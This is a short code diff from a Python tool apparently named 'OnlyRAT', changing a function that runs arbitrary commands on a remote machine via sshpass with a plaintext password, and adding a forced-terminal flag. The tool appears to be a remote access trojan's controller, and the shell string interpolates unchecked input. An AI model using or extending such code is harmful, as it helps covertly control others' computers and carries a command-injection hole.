@@ -126,7 +126,7 @@ def remote_download(ipv4,pword,remote_path_to_file):
     print("[+] Download saved at \"~/Downloads\" directory\n")
 
 def remote_command(ipv4,pword,command):
-    os.system(f"sshpass -p \'{pword}\' ssh onlyrat@{ipv4} '{command}'")
+    os.system(f"sshpass -p \'{pword}\' ssh -tt onlyrat@{ipv4} '{command}'") # use -t or -tt flag to forcefully use a PTY session
 
 def download(ipv4,pword):
     print("\n[~] Enter the file path you want to download :")
